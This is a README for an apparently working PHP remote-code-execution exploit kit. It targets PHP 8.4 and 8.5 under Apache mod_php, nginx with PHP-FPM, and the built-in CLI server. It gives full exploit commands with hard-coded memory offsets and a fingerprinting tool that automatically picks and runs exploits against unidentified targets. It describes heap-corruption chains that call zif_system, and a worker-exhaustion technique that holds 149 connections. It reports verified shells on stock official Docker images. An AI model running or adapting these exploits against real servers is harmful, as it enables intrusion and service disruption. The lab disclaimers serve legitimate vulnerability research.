# php2shell lab

Built by DeepSeek V4 Flash.

This is a lab-only setup for educational research against vulnerable PHP 8.5.11 deployments: Apache mod_php, nginx + PHP-FPM and the PHP built-in CLI server. The lab configurations are intentionally unsafe.

Do not run this against systems you do not own or have explicit authorization to test. Keep the lab isolated and do not expose it to an untrusted network.

## Targets

- `bash lab/start-apache.sh` — urlencoded mode, no-filter build, port 18088.
- `bash lab/start-apache-filter.sh` — filter-enabled build, port 18089.
- `bash lab/start-apache-default.sh` — filter-enabled default-ish limits, port 18090.
- `bash lab/start-apache-session.sh` — session upload-progress target, 8M, port 18091.
- `sudo bash lab/start-php8511-docker.sh` — official PHP 8.5.11 Debian Docker target, port 18093; `--down` removes it.
- `bash lab/start-nginx-fpm.sh` — nginx + PHP-FPM 8.5.11, chain port 8556 and builder port 8557; `--down` stops it.
- `bash lab/start-php-cli.sh` — PHP 8.5.11 built-in server, chain port 18098 and builder port 18099; `--down` stops it.

Filter-enabled `$_FILES` bypass:

```bash
LAB_ASLR=1 bash lab/start-apache-filter.sh
pid=$(cat lab/httpd-filter.pid)
python3 exploit.py --port 18089 --multipart --auto-ar-data --pid "$pid"
```

Default-limit OOM probe:

```bash
bash lab/start-apache-default.sh
python3 probe_default.py --port 18090 --pressure 1000 --levels 60
```

The filter target uses `memory_limit=28M` in `lab/httpd-filter.conf`; the default target uses `memory_limit=128M` and `post_max_size=8M` in `lab/httpd-default.conf`. Recalibrate if the name length or body size changes.

## Fingerprinting and profiles

`fingerprint.py` identifies the PHP version, server/distro, SAPI hint, architecture
override and known build profile, then can dispatch the matching exploit.

```bash
# passive: headers, body hints, cookies, profile ranking
python3 fingerprint.py -u http://127.0.0.1:18093/index.php --arch x86_64

# small upload-progress probe (authorized lab; no OOM)
python3 fingerprint.py -u http://127.0.0.1:18093/index.php --arch x86_64 --active

# one controlled OOM to discover memory_limit (kills/rotates a worker)
python3 fingerprint.py -u http://127.0.0.1:18093/index.php --arch x86_64 --oom-probe

# fingerprint -> profile -> exploit proof
python3 fingerprint.py -u http://127.0.0.1:18093/index.php --arch x86_64 \
    --oom-probe --run -c 'id>/out/p1' --proof-file /tmp/p2s-8511/out/p1
```

`--json` includes the fingerprint and ranked profiles. `--profile NAME` forces a
profile; `--list-profiles` prints the catalog. HTTP does not expose CPU
architecture, so exact auto-dispatch requires `--arch` when both architecture
profiles exist.

For nginx + PHP-FPM or the PHP built-in server, `fingerprint.py` identifies the
persistent-SAPI chain instead of the Apache mod_php chain. FPM/CLI profiles are
build-specific: pass `--profile` for the exact image/build rather than relying
on the PHP version alone:

```bash
# nginx + PHP-FPM lab; local maps supply ASLR bases
python3 fingerprint.py -u http://127.0.0.1:8556/index.php \
    --builder-url http://127.0.0.1:8557 \
    --profile profiles/fpm/8.5.11-fpm.json \
    --persistent --local-bases --run

# PHP CLI built-in server lab; --pid is the supervised chain worker
python3 fingerprint.py -u http://127.0.0.1:18098/index.php \
    --builder-url http://127.0.0.1:18099 \
    --profile profiles/fpm/php-8.5.11-cli.json \
    --persistent --local-bases \
    --pid "$(cat lab/fpm/runtime/php-8.5.11/cli/chain.pid)" --run
```

The persistent chain needs a **builder endpoint** with `memory_limit=64M` and
`session.upload_progress.cleanup=Off`; that endpoint creates the large session
file. The chain endpoint runs at 8M with cleanup On. The target application
must call `session_start()` and reflect session values; `lab/fpm/webroot/app.php`
is the lab example. `--local-bases` is only for a disposable local lab; remote
runs use the HTTP stale-string leak from the shipped 8.2/8.3/8.4 profiles. The
8.5.11 profiles in this repo have calibrated reclaim geometry but not a
calibrated HTTP leak, so remote 8.5.11 runs still need `--chunk/--pie` or a
new calibration.

When the PHP version or architecture is unknown, use the priority fallback:

```bash
python3 fingerprint.py -u http://127.0.0.1:18093/index.php \
    --fallback --max-attempts 4 \
    --run -c 'id>/out/p1' --proof-file /tmp/p2s-8511/out/p1
```

The fallback queue order is:

1. exact PHP version and known matching architecture
2. exact PHP version, x86_64 before aarch64 when architecture is unknown
3. same PHP branch
4. other verified RCE builds

It excludes known-patched versions, non-mod_php SAPI hints, a negative
upload-progress probe, and known multi-worker targets. `--try-all` runs every
runnable profile; `--max-attempts` bounds `--fallback`. Each attempt is
sequential against the same single target and starts with the exploit's normal
worker rotation.

The profile catalog lives in `profiles/catalog.json`; individual
`profiles/*.json` files override catalog entries. It currently covers the public
8.5.11/8.5.10/8.4.26/8.4.25 verified images plus offsets-only and leak-only
entries for 8.3, 8.2, 8.1, 8.0 and 7.4. Only a profile with `rce: true` and all
stage parameters can be auto-run. See `profiles/README.md` for sources and the
exact status table.

The Apache session-chain target must be prefork `mod_php` with one worker. This
port does not pin multiple prefork children; a known multi-worker target is
marked incompatible. The persistent chain instead supports nginx + PHP-FPM and
the PHP built-in CLI server through the separate `fpm_exploit.py` primitive.
The OOM probe and both chains are disruptive; use them only on an authorized,
disposable lab.

## Session chain

`session_exploit.py` ports the 9bie/Exploit-DB three-stage session chain (pre-RINIT OOM → `Set-Cookie` leaks → fake reference → `zif_system`).

Verified end-to-end against the official PHP 8.5.11 Docker target, twice consecutively:

```bash
sudo bash lab/start-php8511-docker.sh
python3 session_exploit.py \
    -u http://127.0.0.1:18093/index.php \
    -c 'id>/out/p1' --proof-file /tmp/p2s-8511/out/p1 \
    --poison big --huge-mb 12 --rotate \
    --zif-offset 0x5996e0 --dtor-offset 0x7b47a0 \
    --htdata-offset 0x690d8 \
    --stage1-n 841 --stage1-forge-len 63 \
    --stage2-t 406 --stage2-v 16 --carrier
```

Proof:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The Docker target must use `session.use_only_cookies=1` (the official default; the launcher now does). Stage 2 also needs the `f0000`/`x` 1001-field poison, and stage 3 needs the bookworm `Cookie: PHPSESSID=aaa...` header to keep `PS(id)` valid.

The heap geometry is build-specific. The custom minimal PHP 8.5.11 binary in this repo does not reproduce stage 1 with the official profile (it returns a normal 32-byte session cookie); use the official Docker target or calibrate a profile for that exact `libphp-nts.so`.

The official calibration probe/sweep is ported in `calibrate_session.py`:

```bash
bash lab/start-apache-session.sh
python3 calibrate_session.py -u http://127.0.0.1:18091/index.php \
    --proof-file /tmp/p --out profiles/php-8.5.11-local.json
```

On this minimal build it currently stops at stage 1: the `N=900`/forge-48 probe returns a normal 32-byte cookie with no `vNNNN` stale-block index. A profile for this exact binary is still required; the official 8.5.11 profile values do not transfer to it.

## Persistent-SAPI chain (nginx + PHP-FPM / PHP CLI server)

`fpm_exploit.py` implements the second, FPM-validated primitive:
post-RINIT OOM in `session_start()` leaves `BG(unserialize)` dangling; a later
multipart request starts session decoding in the pre-RINIT `rfc1867` handler
and reclaims the freed `php_unserialize_data` with a forged var_hash. The
forged session reference destroys a fake `HashTable` whose `pDestructor` is
`zif_system`. This is not the Apache pre-RINIT chain: FPM exits a child when
request startup fails, so it uses an application-level producer instead.

The lab webroot is `lab/fpm/webroot`; the application pages are:

- `app.php` — calls `session_start()` and reflects session values.
- `bigvar.php` — builds the large session that triggers the producer OOM.
- `ref.php` — stores a reference so the consumer can decode `R:2`.
- `index.php` — health check and SAPI/version hint.

The persistent launchers use `PHP_FPM`/`PHP_CLI`/`NGINX_BIN` if set; otherwise they use a system binary or fall back to `nix build nixpkgs#php85` and `nixpkgs#nginx`. Start either persistent lab:

```bash
bash lab/start-nginx-fpm.sh
# chain:   http://127.0.0.1:8556/app.php
# builder: http://127.0.0.1:8557/app.php

bash lab/start-php-cli.sh
# chain:   http://127.0.0.1:18098/app.php (supervised)
# builder: http://127.0.0.1:18099/app.php
```

Run the chain directly:

```bash
# FPM
python3 fpm_exploit.py \
    --base http://127.0.0.1:8556 --builder http://127.0.0.1:8557 \
    --version 8.5.11 --profile profiles/fpm/8.5.11-fpm.json \
    --command 'id>out/p1' --proof-file out/p1 \
    no-oracle --local-bases

# CLI built-in server (the supervisor restarts the aborted worker)
python3 fpm_exploit.py \
    --base http://127.0.0.1:18098 --builder http://127.0.0.1:18099 \
    --version 8.5.11 --profile profiles/fpm/php-8.5.11-cli.json \
    --pid "$(cat lab/fpm/runtime/php-8.5.11/cli/chain.pid)" \
    --command 'id>out/cli-p1' --proof-file out/cli-p1 \
    no-oracle --local-bases
```

Verified in this workspace:

```text
nginx+FPM:  uid=1000(fipso) gid=100(users) groups=...
CLI server: uid=1000(fipso) gid=100(users) groups=...
```

The 8.5.11 FPM and CLI profiles have calibrated reclaim geometry, but their
HTTP stale-string leak geometry is not calibrated; remote use therefore needs
`--chunk/--pie` or a profile calibrated with `fpm_exploit.py ... calibrate`.
The shipped 8.2/8.3/8.4 FPM profiles have HTTP-leak calibration and can be used
without local `/proc` access when the exact build matches.

`fpm_exploit.py`, `fpm_labs.py`, the FPM lab templates and the 8.2-8.4 profiles
are derived from `devploit/php2shell` (MIT); see `profiles/fpm/README.md` and the
upstream repository. They are intentionally separate from the Apache mod_php
session chain. Worker pinning is not implemented for a multi-worker FPM pool;
the labs pin one chain worker. Use only on systems you own or are explicitly
authorized to test.

## Docker image checks

Real images were pulled with rootless `podman` (no Docker daemon access was
needed) and driven through `fingerprint.py`. The Apache targets used the image's
prefork MPM pinned to one worker, `display_errors=On`, and a mounted lab INI.

| Image | Effective config | Automatic result |
|---|---|---|
| `php:8.4.26-apache` | 8M / 64M post, one worker | **RCE**, `uid=33(www-data)` |
| `php:8.4.26-apache` | 128M / 256M post, one worker | **RCE**, `uid=33(www-data)` |
| `php:8.5.11-apache` | 8M / 64M post, one worker | **RCE**, `uid=33(www-data)` |
| `php:8.5.11-apache` | 128M / 256M post, one worker | **RCE**, `uid=33(www-data)` via `php-8.5.11-bookworm-amd64-128m` |
| `php:8.4.26-fpm` + `nginx:1.30-alpine` | chain 8M, builder 64M | automatic FPM dispatch refused: no trusted image-specific profile; a direct attempt with the upstream profile did not produce proof |
| `php:8.5.11-fpm` + `nginx:1.30-alpine` | chain 8M, builder 64M | automatic FPM dispatch refused: no trusted 8.5.11 FPM profile |
| `nginx:1.30-alpine` reverse proxy to `php:8.5.11-apache` | body reports `apache2handler` | correctly identified Apache, but the proxy path returned 502 during the pre-RINIT leak; direct Apache succeeded |
| `php:8.4.26-apache` | **stock** `php.ini-production`, 150 workers, 128M/8M, display off | **RCE** via `default_config.py` / 9bie pure chain, `uid=33(www-data)` |

The stock `php:*-apache` defaults are `memory_limit=128M`, `post_max_size=8M`,
`upload_max_filesize=2M`, `MaxRequestWorkers=150` and `display_errors=STDOUT`.
The older 8M session profile needs a lab INI and one worker. The separate
stock-config chain below has been verified on the untouched 8.4.26 image with
150 workers and `php.ini-production`. The 8.5.11 128M profile is
`profiles/php-8.5.11-128m.json`.

FPM/CLI profiles are marked `build_specific`. `fingerprint.py` will show them
but will not auto-run one by version alone; pass `--profile` for the exact
image/build, or calibrate it. This prevents the upstream minimal-build 8.4
profile from being mistaken for the official `php:8.4.26-fpm` image.

## Default-config chain (stock `php:8.4.26-apache`)

The earlier session-chain profiles require `display_errors=On`, a small
`memory_limit`, and one worker. They are not a default-image exploit. The
default-config chain is separate: it uses the public 9bie pure-HTTP research
(stage A1 send-cookie OOM → B1 stale-id OOB leak → A2 cheap OOM → B2 fake
HashTable), only chunked multipart and ordinary HTTP requests, and the stock
`php.ini-production`:

- `display_errors=Off`
- `memory_limit=128M`, `post_max_size=8M`
- official prefork MPM, `MaxRequestWorkers=150`
- target page only `<?php echo "OK\n"; ?>`
- no custom target INI or MPM override

Verified run against the official image:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The chain holds 149 prefork children with incomplete POST bodies, leaving one
worker for A1/B1/A2/B2, and bypasses `post_max_size` with
`Transfer-Encoding: chunked`. The leak parser is adjusted locally for kernels
that map the worker at `0x7x…` instead of `0x7f…`.

### Run it

The upstream research repository has no license file, so it is **not
vendored** here. Fetch it yourself; the adapter only runs a temporary patched
copy of that checkout:

```bash
git clone --depth 1 https://github.com/9bie/php2shell-bypass-aslr-exp \
    vendor/php2shell-bypass-aslr-exp
bash lab/start-pure-8426.sh
python3 default_config.py \
    --port 18110 --workers 150 \
    --proof out/pure-8426/p1
```

`lab/start-pure-8426.sh` uses Docker when reachable, otherwise Podman; set
`CONTAINER_ENGINE` or `PODMAN` if the engine is outside `PATH`. It starts
`php:8.4.26-apache`, copies the image's own `php.ini-production`, mounts the
trivial page and `/out`, and leaves the official 150-worker MPM untouched.

This chain is calibrated for **8.4.26 only**. It is not the 8.5.11 profile,
does not cover PHP-FPM, and is disruptive: it opens 149 partial connections
and triggers OOM bailouts. Use it only against an isolated, authorized target.
